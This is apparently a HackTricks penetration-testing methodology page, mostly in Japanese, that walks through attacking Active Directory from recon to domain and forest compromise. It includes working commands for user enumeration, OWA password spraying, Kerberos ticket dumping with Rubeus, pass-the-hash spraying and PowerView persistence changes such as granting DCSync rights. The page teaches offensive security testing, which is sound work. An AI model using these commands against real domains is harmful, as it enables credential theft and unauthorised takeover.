# Active Directory 方法論

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は基盤技術として機能し、**ネットワーク管理者** がネットワーク内の **ドメイン**、**ユーザー**、および **オブジェクト** を効率的に作成・管理できるようにします。大量のユーザーを扱いやすい **グループ** や **サブグループ** に整理し、さまざまなレベルで **アクセス権** を制御できるように設計されています。

**Active Directory** の構造は主に 3 層で構成されます：**ドメイン**、**ツリー**、および **フォレスト**。**ドメイン** は共通のデータベースを共有するユーザーやデバイスなどのオブジェクトの集合を含みます。**ツリー** は共通の構造で結ばれたドメイン群で、**フォレスト** は複数のツリーをまとめ、**信頼関係** を通じて相互接続された、組織構造の最上位に位置するものです。各レベルで特定の **アクセス** や **通信権限** を指定できます。

**Active Directory** の重要な概念は以下のとおりです：

1. **ディレクトリ** – Active Directory オブジェクトに関するすべての情報を保持します。
2. **オブジェクト** – ディレクトリ内のエンティティを示し、**ユーザー**、**グループ**、または **共有フォルダ** などが含まれます。
3. **ドメイン** – ディレクトリオブジェクトのコンテナであり、複数のドメインが **フォレスト** 内に共存し、それぞれが独自のオブジェクト集合を持ちます。
4. **ツリー** – 共通のルートドメインを共有するドメインのグループです。
5. **フォレスト** – Active Directory における組織構造の頂点で、複数のツリーとそれらの間の **信頼関係** で構成されます。

**Active Directory Domain Services (AD DS)** は、ネットワーク内の集中管理や通信に不可欠な一連のサービスを含みます。これらのサービスには以下が含まれます：

1. **Domain Services** – データの集中管理を行い、**ユーザー** と **ドメイン** 間のやり取り（**認証** や検索機能など）を管理します。
2. **Certificate Services** – セキュアな **デジタル証明書** の作成、配布、および管理を担当します。
3. **Lightweight Directory Services** – **LDAP protocol** を通じてディレクトリ対応アプリケーションをサポートします。
4. **Directory Federation Services** – 複数のウェブアプリケーションでの **single-sign-on** 機能を提供します。
5. **Rights Management** – 著作権資料の不正配布や使用を制御することで保護を支援します。
6. **DNS Service** – **ドメイン名** の解決に不可欠です。

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## チートシート

AD を列挙／悪用するために実行できるコマンドを素早く確認するには、次を参照してください: [https://wadcoms.github.io/](https://wadcoms.github.io)。

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (認証情報/セッションなし)

AD 環境にアクセスできるが認証情報やセッションを持っていない場合、次のことが可能です：

- **ネットワークをペネトレートする:**
- ネットワークをスキャンし、マシンや開いているポートを見つけて、**脆弱性を悪用** したり、そこから **認証情報を抽出** したりします（例： [printers could be very interesting targets](ad-information-in-printers.md)）。
- DNS を列挙することで、web、printers、shares、vpn、media などのドメイン内の重要サーバに関する情報が得られます。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 詳細は一般的な [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) を参照して手順を確認してください。
- **SMB サービスの null と Guest アクセスを確認する**（これは最新の Windows では動作しないことがあります）:
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB サーバの列挙方法に関する詳細ガイドは次を参照してください：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP を列挙する**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP 列挙に関する詳細ガイド（**匿名アクセスに特に注意**）は次を参照してください：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **ネットワークを Poison する**
- Responder で **サービスを偽装して認証情報を収集**（impersonating services with Responder）してクレデンシャルを集める: ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
- [**relay attack** を悪用してホストにアクセスする](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- evil-S を使って **偽の UPnP サービスを公開して認証情報を収集**（exposing fake UPnP services with evil-S）: ../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md および [**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 内部文書、ソーシャルメディア、ドメイン内のサービス（主に web）、および公開情報からユーザー名や氏名を抽出します。
- 会社の従業員の氏名が判明した場合、さまざまな AD **username conventions**（**read this**）を試すことができます。一般的な慣例には以下があります：_NameSurname_, _Name.Surname_, _NamSur_（それぞれ 3 文字ずつ）, _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 文字のランダム + 3 数字（abc123）。
- ツール:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### ユーザー列挙

- **匿名 SMB/LDAP 列挙:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) および [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) を参照してください。
- **Kerbrute 列挙**: 無効なユーザー名が要求されると、サーバは **Kerberos error** コード _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ を返し、ユーザー名が無効であることを判別できます。有効なユーザー名は、AS-REP 内の **TGT** を返すか、または事前認証が必要であることを示す _KRB5KDC_ERR_PREAUTH_REQUIRED_ エラーを返します。
- **MS-NRPC に対する No Authentication:** domain controller の MS-NRPC (Netlogon) インターフェースに対して auth-level = 1（No authentication）を使用します。この方法は MS-NRPC インターフェースにバインド後に `DsrGetDcNameEx2` 関数を呼び出して、認証情報なしでユーザーやコンピュータの存在を確認します。NauthNRPC (https://github.com/sud0Ru/NauthNRPC) はこの種の列挙を実装しています。研究の詳細はここにあります: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

ネットワーク内でこれらのサーバーのいずれかを見つけた場合、**user enumeration against it** を実行することもできます。例えば、ツール [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> ユーザー名のリストは [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) とこちらの ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) で見つけることができます。
>
> ただし、事前の recon ステップで得た **会社で働く人々の氏名** を持っているはずです。名前と姓があれば、スクリプト [**namemash.py**](https://gist.github.com/superkojiman/11076951) を使って潜在的な有効ユーザー名を生成できます。

### Knowing one or several usernames

有効なユーザー名は分かっているがパスワードがない場合は、次を試してください：

- [**ASREPRoast**](asreproast.md): ユーザーが **_DONT_REQ_PREAUTH_ を持っていない** 場合、そのユーザーに対して **AS_REP message を要求**できます。メッセージにはユーザーのパスワードから派生したもので暗号化されたデータが含まれます。
- [**Password Spraying**](password-spraying.md): 発見した各ユーザーに対して、最も **一般的なパスワード** を試してみてください。弱いパスワードを使っているユーザーがいるかもしれません（パスワードポリシーに注意！）。
- 注意: ユーザーのメールサーバーにアクセスするために、**spray OWA servers** を試すこともできます。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

ネットワークのいくつかのプロトコルを**poisoning**することで、クラック用のチャレンジ**hashes**を**obtain**できる場合があります：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory の列挙に成功すれば、**より多くのメールアドレスやネットワークの全体像**を得られます。NTLM を使った [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) を強制して AD 環境にアクセスできる可能性があります。

### Steal NTLM Creds

**null or guest user** で他の PC や共有に **アクセス** できる場合、(SCF ファイルなどの) ファイルを **配置** しておき、何らかの方法でそれが参照されるとあなたに対して **NTLM authentication がトリガー**され、**NTLM challenge** を **盗んで** クラックすることができます：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Enumerating Active Directory WITH credentials/session

このフェーズでは、有効なドメインアカウントの**資格情報またはセッションを侵害している**必要があります。ドメインユーザーとして有効な資格情報やシェルを持っている場合、**前に挙げたオプションは他ユーザーを侵害するための選択肢として依然有効である**ことを忘れないでください。

認証済み列挙を開始する前に、**Kerberos double hop problem** を理解しておくべきです。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

アカウントを侵害することは、ドメイン全体を侵害するための**大きな一歩**です。これにより **Active Directory 列挙** を開始できるようになります。

[**ASREPRoast**](asreproast.md) に関しては、すべての潜在的に脆弱なユーザーを見つけられますし、[**Password Spraying**](password-spraying.md) に関しては **全ユーザー名のリスト** を取得して、侵害したアカウントのパスワード、空のパスワード、あるいは有望な新しいパスワードを試すことができます。

- 基本的な recon を実行するために [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) を使用できます
- よりステルスに行うには [**powershell for recon**](../basic-powershell-for-pentesters/index.html) を使うこともできます
- より詳細な情報を抽出するには [**use powerview**](../basic-powershell-for-pentesters/powerview.md) を使えます
- Active Directory の recon にもう一つ素晴らしいツールは [**BloodHound**](bloodhound.md) です。使用するコレクション方法によりますが、**あまりステルスではありません**。しかしそれを気にしないなら、ぜひ試してみてください。ユーザーがどこで RDP できるか、他のグループへの経路を見つけるなど。
- **その他の自動化された AD 列挙ツール:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) は興味深い情報を含んでいる可能性があります。
- ディレクトリを列挙するために使える **GUI ツール** は **AdExplorer.exe**（**SysInternal** Suite）です。
- **ldapsearch** で LDAP データベースを検索し、_userPassword_ や _unixUserPassword_ のフィールド、あるいは _Description_ を調べることもできます。その他の方法については cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) を参照してください。
- **Linux** を使っている場合は、[**pywerview**](https://github.com/the-useless-one/pywerview) でドメインを列挙することもできます。
- また以下の自動化ツールを試すこともできます:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Windows では `net user /domain`、`Get-DomainUser`、または `wmic useraccount get name,sid` でドメイン内のユーザー名を取得するのは非常に簡単です。Linux では `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` や `enum4linux -a -u "user" -p "password" <DC IP>` を使用できます。

> この列挙セクションが短く見えても、最も重要な部分です。リンク（主に cmd、powershell、powerview、BloodHound のもの）を参照し、ドメインの列挙方法を学び、十分に慣れるまで練習してください。評価の際、ここが DA に到達する方法を見つけるか、何もできないと判断する重要な瞬間になります。

### Kerberoast

Kerberoasting は、ユーザーアカウントに紐づくサービスが使用する **TGS tickets** を取得し、それらの暗号化（ユーザーパスワードに基づく）を **オフライン** でクラックすることを含みます。

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

資格情報を入手したら、任意のマシンにアクセスできるか確認してください。そのために、ポートスキャンに応じて複数のサーバーへ異なるプロトコルで接続を試みるために **CrackMapExec** を使用できます。

### Local Privilege Escalation

通常のドメインユーザーとして資格情報やセッションを侵害しており、そのユーザーでドメイン内の任意のマシンに **アクセス** できる場合、ローカルで権限昇格して資格情報を回収（loot）する方法を探すべきです。なぜなら、ローカル管理者権限がなければ他ユーザーのハッシュをメモリ（LSASS）やローカル（SAM）からダンプできないからです。

本書には [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) に関する完全なページと、[**checklist**](../checklist-windows-privilege-escalation.md) があります。また、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) の使用も忘れないでください。

### Current Session Tickets

現在のユーザーに、予期しないリソースへの**アクセス権を与える**ような**tickets** が見つかる可能性は非常に **低い** ですが、確認はできます：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the Active Directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### コンピュータ共有で資格情報を探す | SMB Shares

基本的な資格情報を入手したら、AD 内で共有されている**興味深いファイル**がないか**確認**してください。手動でも可能ですが、非常に退屈で反復的な作業になります（数百のドキュメントを確認する必要がある場合はさらに大変です）。

[**このリンクから使用可能なツールについて学んでください。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

If you can **access other PCs or shares** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Hopefully you have managed to **compromise some local admin** account using [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
その後、メモリおよびローカルからすべてのハッシュをダンプする時です。\
[**ハッシュを取得するさまざまな方法についてはこちらのページを読んでください。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
そのためには、そのハッシュを使って**NTLM authenticationを行う**ような**ツール**を使用するか、あるいは新しい**sessionlogon**を作成してそのハッシュを**LSASS**に**注入**する方法があります。そうすれば、NTLM 認証が行われる際にそのハッシュが使用されます。後者の方法がmimikatzのやり方です。\
[**詳細はこのページを参照してください。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

If you have the **hash** or **password** of a **local administrator** you should try to **login locally** to other **PCs** with it.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 注意: これはかなり**noisy**で、**LAPS**が**mitigate**します。

### MSSQL Abuse & Trusted Links

もしユーザが**access MSSQL instances**する権限を持っている場合、MSSQLホスト上で（SAとして実行されていれば）**execute commands**したり、NetNTLMの**hash**を**steal**したり、さらには**relay** **attack**を実行できる可能性があります。\
また、あるMSSQLインスタンスが別のMSSQLインスタンスからtrust（database link）されている場合、ユーザが信頼されたデータベースに対する権限を持っていれば、**use the trust relationship to execute queries also in the other instance**ことが可能になります。これらのトラストは連鎖することがあり、最終的にコマンドを実行できるような誤設定されたデータベースを見つけられるかもしれません。\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

サードパーティのインベントリやデプロイメントスイートは、資格情報やコード実行への強力な経路を露出することがよくあります。参照:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

もしComputerオブジェクトに属性[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)があり、かつそのコンピュータ上でドメイン権限を持っている場合、当該コンピュータにログオンしたすべてのユーザのメモリからTGTをダンプすることができます。\
したがって、**Domain Adminがそのコンピュータにログインすると**、彼のTGTをダンプして[Pass the Ticket](pass-the-ticket.md)を使ってなりすますことができます。\
constrained delegationを利用すれば、**自動的にPrint Serverを乗っ取る**ことさえ可能です（運が良ければそれはDCでしょう）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

もしユーザまたはコンピュータが "Constrained Delegation" を許可されていると、そのコンピュータ上のあるサービスに対して**任意のユーザをインパーソネートしてアクセスする**ことができるようになります。\
そして、このユーザ／コンピュータのハッシュを**compromise**すれば、（ドメイン管理者であっても）**任意のユーザをインパーソネートして**サービスにアクセスできます。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

リモートコンピュータのActive Directoryオブジェクトに対して**WRITE**権限を持つことは、**昇格した権限**でコード実行を達成することを可能にします:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

乗っ取ったユーザが、今後**横移動／権限昇格**を可能にするような**興味深い権限をドメインオブジェクトに対して持っている**ことがあります。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

ドメイン内で**Spool serviceがリッスンしている**ことを発見すると、これを**悪用して新しい資格情報を取得**し、**権限を昇格**することができます。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

もし**他のユーザが**その**compromised**マシンに**アクセス**している場合、メモリから資格情報を**gather**したり、彼らのプロセスに**beaconsをinject**してなりすますことが可能です。\
通常、ユーザはRDP経由でシステムにアクセスするため、サードパーティRDPセッションに対していくつかの攻撃を実施する方法は次の通りです:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**はドメイン参加コンピュータの**local Administrator password**を管理するシステムを提供し、それらを**ランダム化**、一意化、頻繁に**変更**します。これらのパスワードはActive Directoryに保存され、アクセスはACLを通じて許可されたユーザだけに制御されます。これらのパスワードにアクセスするための十分な権限があれば、他のコンピュータへのピボットが可能になります。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**compromised machineからのcertificatesの収集**は、環境内で権限を昇格する手段になり得ます:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

もし**脆弱なテンプレート**が設定されていれば、それらを悪用して権限を昇格することが可能です:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}

### Post-exploitation with high privilege account

### Dumping Domain Credentials

一度**Domain Admin**、あるいはさらに良い**Enterprise Admin**の権限を取得すると、ドメインデータベースである _ntds.dit_ を**dump**できます。

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

前述のいくつかの技術は、永続化のためにも使用できます。\
例えば、次のようなことが可能です:

- ユーザを[**Kerberoast**](kerberoast.md)に脆弱にする

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- ユーザを[**ASREPRoast**](asreproast.md)に脆弱にする

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- ユーザに[**DCSync**](#dcsync)権限を付与する

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**は、特定のサービス向けに正当なTicket Granting Service (TGS)チケットを、（例えばPCアカウントの）**NTLM hash**を用いて作成する攻撃です。この手法は**サービスの権限にアクセスする**ために使用されます。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**は、Active Directory環境における**krbtgtアカウントのNTLM hash**を攻撃者が入手することを含みます。krbtgtはすべての**Ticket Granting Tickets (TGTs)**を署名するために用いられる特別なアカウントです。

攻撃者がこのハッシュを入手すると、任意のアカウントの**TGTs**を作成できるようになります（Silver ticket攻撃の一種）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

これは、一般的なgolden ticket検出メカニズムを**回避するようにforgeされたgolden ticketのようなもの**です。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**アカウントのcertificatesを保持している、またはそれらを要求できること**は、ユーザのアカウントに永続化する非常に有効な手段です（たとえパスワードを変更されても）:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**certificatesを使用して、ドメイン内で高権限の永続化を行う**ことも可能です:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directoryの**AdminSDHolder**オブジェクトは、Domain AdminsやEnterprise Adminsのような**特権グループ**のセキュリティを確保するため、これらのグループに対して標準の**ACL**を適用して不正な変更を防ぎます。しかし、この機能は悪用され得ます。攻撃者がAdminSDHolderのACLを変更して通常ユーザにフルアクセスを与えれば、そのユーザはすべての特権グループに対して広範な制御を得ることになります。本来保護のための機能が、監視されていなければ不正アクセスを許すことがある、という点に注意してください。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

すべての**Domain Controller (DC)**には**ローカル管理者**アカウントが存在します。そうしたマシンで管理者権を取得すれば、mimikatzを使ってローカルAdministratorのハッシュを抽出できます。その後、リモートでこのパスワードを使用できるようにするためにレジストリの変更が必要になります。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

特定のドメインオブジェクトに対して、将来的に権限昇格を可能にするような**特別な権限をユーザに付与する**ことができます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors**は、オブジェクトが持つ**権限**を**格納する**ために使用されます。もしオブジェクトのセキュリティディスクリプタに**少し変更**を加えられるだけで、特権グループのメンバーでなくてもそのオブジェクトに対して非常に興味深い権限を得ることができます。


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

LSASSのメモリを改変して**ユニバーサルパスワード**を設定し、すべてのドメインアカウントへのアクセスを可能にします。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
独自の**SSP**を作成して、マシンにアクセスする際に使用される**credentialsを平文でcapture**することができます。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

新しいDomain ControllerをADに登録し、それを使って指定したオブジェクトに対してSIDHistoryやSPNsなどの属性を**ログを残さずにpush**します。これを行うにはDA権限とルートドメイン内での実行が必要です。\
ただし、誤ったデータを使うとかなり目立つログが出る点に注意してください。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

前節では**LAPSパスワードを読むための十分な権限がある場合の権限昇格**について説明しました。しかし、これらのパスワードは**永続化のためにも利用**できます。\
参照:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoftは**Forest**をセキュリティ境界と見なしています。つまり、**単一ドメインの侵害がForest全体の侵害につながる可能性がある**ということです。

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)は、ある**ドメイン**のユーザが別の**ドメイン**のリソースにアクセスすることを可能にするセキュリティメカニズムです。これは2つのドメインの認証システム間の連結を作成し、認証検証がシームレスに流れるようにします。ドメインがトラストを設定すると、トラストの整合性に重要な特定の**keys**を各Domain Controller (DC)が交換して保持します。

典型的なシナリオでは、ユーザが**trusted domain**のサービスにアクセスしようとする際、まず自ドメインのDCから**inter-realm TGT**を要求する必要があります。このTGTは両ドメインで合意された共有の**key**で暗号化されます。ユーザはこのTGTを**trusted domainのDC**に提示してサービスチケット（**TGS**）を取得します。trusted domainのDCがinter-realm TGTを検証すると、TGSを発行してユーザにサービスへのアクセスを許可します。

**Steps**:

1. **Domain 1**の**client computer**が自身の**NTLM hash**を使って**Domain Controller (DC1)**に**Ticket Granting Ticket (TGT)**を要求することから始まります。
2. クライアントが正常に認証されれば、DC1は新しいTGTを発行します。
3. その後、クライアントは**Domain 2**のリソースにアクセスするために必要な**inter-realm TGT**をDC1に要求します。
4. inter-realm TGTは、両ドメイン間の双方向ドメイントラストの一部としてDC1とDC2が共有する**trust key**で暗号化されます。
5. クライアントはinter-realm TGTを**Domain 2のDomain Controller (DC2)**に持って行きます。
6. DC2は共有されたtrust keyを使ってinter-realm TGTを検証し、有効であればクライアントがアクセスしようとしているDomain 2内のサーバ向けに**Ticket Granting Service (TGS)**を発行します。
7. 最後にクライアントはこのTGSをサーバに提示し、サーバアカウントのハッシュで暗号化されたTGSを使ってDomain 2のサービスにアクセスします。

### Different trusts

トラストが**一方向（1 way）か双方向（2 ways）か**であることに注意してください。双方向のオプションでは両方のドメインが互いに信頼しますが、**一方向**のトラスト関係では一方が**trusted**、もう一方が**trusting**ドメインになります。後者の場合、**trusted側からのみtrustingドメイン内のリソースにアクセスできる**ことになります。

もしDomain AがDomain Bを信頼している場合、AはtrustingドメインでBはtrustedドメインです。さらに、**Domain A**ではこれは**Outbound trust**となり、**Domain B**では**Inbound trust**となります。

**Different trusting relationships**

- **Parent-Child Trusts**: 同一フォレスト内で一般的な構成で、child domainは自動的にparent domainと双方向の推移的トラストを持ちます。つまり、親と子の間で認証要求がシームレスに流れることを意味します。
- **Cross-link Trusts**: "shortcut trusts"とも呼ばれ、childドメイン間の参照プロセスを高速化するために確立されます。大規模なフォレストでは、認証参照は通常フォレストルートまで上がってからターゲットドメインまで下る必要がありますが、cross-linkを作成することで経路が短縮されます。
- **External Trusts**: これは異なる、無関係なドメイン間で設定され、非推移的です。Microsoftのドキュメントによれば、external trustsはフォレストトラストで接続されていないフォレスト外のドメインのリソースにアクセスするのに有用です。external trustsではSIDフィルタリングによってセキュリティが強化されます。
- **Tree-root Trusts**: これらのトラストはフォレストルートドメインと新しく追加されたツリールート間で自動的に確立されます。頻繁には見られませんが、新しいドメインツリーをフォレストに追加する際に重要で、二方向の推移性を維持します。
- **Forest Trusts**: これは2つのフォレストルートドメイン間の双方向かつ推移的なトラストで、SIDフィルタリングも強制してセキュリティを強化します。
- **MIT Trusts**: これらは非Windowsの[RFC4120準拠](https://tools.ietf.org/html/rfc4120)のKerberosドメインと確立されます。MIT trustsはやや特殊で、Windowsエコシステム外のKerberosベースのシステムとの統合を必要とする環境に対応します。

#### Other differences in **trusting relationships**

- トラスト関係は**推移的（transitive）**（AがBを信頼し、BがCを信頼していればAはCを信頼する）であったり**非推移的**であったりします。
- トラスト関係は**双方向トラスト**（両方が互いを信頼）として設定されることも、**一方向トラスト**（一方のみが他方を信頼）として設定されることもあります。

### Attack Path

1. **Enumerate** the trusting relationships
2. チェックして、どの**security principal**（user/group/computer）が**他ドメインのリソースに**ACEエントリや他ドメインのグループのメンバシップによって**アクセス**を持っているかを確認します。**domains間の関係**を探してください（おそらくそのためにトラストが作成されています）。
1. この場合、kerberoastも別のオプションになり得ます。
3. ドメイン間を**pivot**できる**accounts**を**compromise**します。

攻撃者が別ドメインのリソースにアクセスする方法は主に次の3つです:

- **Local Group Membership**: プリンシパルがサーバ上の“Administrators”のようなローカルグループに追加されることがあり、そのマシンに対する大きな制御を与えます。
